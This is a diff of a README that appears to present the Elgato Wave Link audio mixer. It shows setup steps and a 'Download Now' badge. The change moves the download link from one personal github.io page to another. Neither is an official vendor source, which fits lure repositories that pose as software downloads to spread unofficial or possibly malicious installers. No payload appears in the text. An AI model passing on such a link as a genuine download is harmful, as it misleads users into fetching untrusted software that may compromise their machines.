@@ -44,7 +44,7 @@ A careful effects chain keeps live audio polished without slowing production. Li
 | 4 | Add microphone, browser, music, game, chat, and system channels to the wave link audio mixer |
 | 5 | Route the stream mix into OBS or another app, then test monitoring levels before going live |
 
-[![Download Wave Link](https://img.shields.io/badge/Download-Now-3498db?style=for-the-badge&logo=elgato&logoColor=white)](https://carlottamiyamoto.github.io/.github/wave-link-3-0)
+[![Download Wave Link](https://img.shields.io/badge/Download-Now-3498db?style=for-the-badge&logo=elgato&logoColor=white)](https://ungu08669.github.io/.github/wave-link-3-0)
 
 ## Workflow Capability Grid
 
